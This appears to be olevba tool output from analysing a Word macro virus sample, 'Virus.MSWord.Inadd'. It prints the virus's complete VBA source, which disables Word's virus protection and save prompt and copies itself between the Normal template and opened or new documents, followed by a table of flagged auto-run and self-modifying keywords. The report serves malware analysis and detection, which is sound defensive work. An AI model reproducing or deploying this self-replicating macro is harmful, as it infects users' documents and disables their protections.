olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Inadd
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Inadd - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
Options.VirusProtection = False
Options.SaveNormalPrompt = False

If MacroContainer.FullName = NormalTemplate.FullName Then Set Infect = ActiveDocument.VBProject.vbcomponents(1).codemodule: SaveIt = 1
If MacroContainer.FullName = ActiveDocument.FullName Then Set Infect = NormalTemplate.VBProject.vbcomponents(1).codemodule
If Infect.countoflines < 1 Then Infect.addfromstring MacroContainer.VBProject.vbcomponents(1).codemodule.lines(1, MacroContainer.VBProject.vbcomponents(1).codemodule.countoflines)
If SaveIt = 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, Fileformat:=wdDocument

Payload:

End Sub

Private Sub document_new()
Set Norm = NormalTemplate.VBProject.vbcomponents(1).codemodule
Set Active = ActiveDocument.VBProject.vbcomponents(1).codemodule

Active.addfromstring Norm.lines(1, Norm.countoflines)
ActiveDocument.Saved = True

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_new        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

